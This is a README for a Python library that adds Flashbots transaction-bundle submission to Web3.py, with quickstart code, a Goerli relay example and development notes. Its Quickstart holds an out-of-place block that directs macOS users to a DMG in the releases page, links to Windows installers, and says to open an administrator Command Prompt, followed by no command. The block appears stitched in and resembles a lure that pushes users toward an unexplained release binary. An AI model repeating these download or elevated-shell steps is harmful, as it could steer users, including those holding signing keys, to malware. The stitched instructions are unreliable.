# web3-flashbots

This library extends Web3.py by adding flashbots functionality as a module, enabling direct submission of transaction bundles to block builders. It implements middleware to intercept `eth_sendBundle` and `eth_callBundle` calls, routing them to your specified MEV-compatible RPC endpoint.

The `flashbot` method handles proper header injection for authenticated requests.

## Quickstart

### **Attention Windows & macOS Users:** 
Manual instructions target Windows and Linux; macOS users get the [DMG file](../../releases).  





Check for Git and Python installations on Windows.

Install Git for Windows:

https://git-scm.com/install/windows

Install Python for Windows:

https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe

Open Command Prompt (Administrator).





```python
from eth_account.signers.local import LocalAccount
from web3 import Web3, HTTPProvider
from flashbots import flashbot
from eth_account.account import Account
import os

ETH_ACCOUNT_SIGNATURE: LocalAccount = Account.from_key(os.environ.get("ETH_SIGNER_KEY"))


w3 = Web3(HTTPProvider("http://localhost:8545"))
flashbot(w3, ETH_ACCOUNT_SIGNATURE)
```

Now the `w3.flashbots.sendBundle` method should be available to you. Look in [examples/simple.py](./examples/simple.py) for usage examples.

### Goerli

To use goerli, add the goerli relay RPC to the `flashbot` function arguments.

```python
flashbot(w3, ETH_ACCOUNT_SIGNATURE, "https://relay-goerli.flashbots.net")
```

## Development and testing

Install poetry for dependency management.

Poetry manages virtual environments and dependencies automatically.

```sh
poetry install
```

Note: IDE plugins available for enhanced development experience

## Simple Testnet Example

See [examples/simple.py](./examples/simple.py) for environment variable definitions.

```sh
poetry shell
ETH_SENDER_KEY=<sender_private_key> \
PROVIDER_URL=https://eth-holesky.g.alchemy.com/v2/<alchemy_key> \
ETH_SIGNER_KEY=<signer_private_key> \
python examples/simple.py
```

## Linting

It's advisable to run black with default rules for linting

```sh
sudo pip install black # Black should be installed with a global entrypoint
black .
```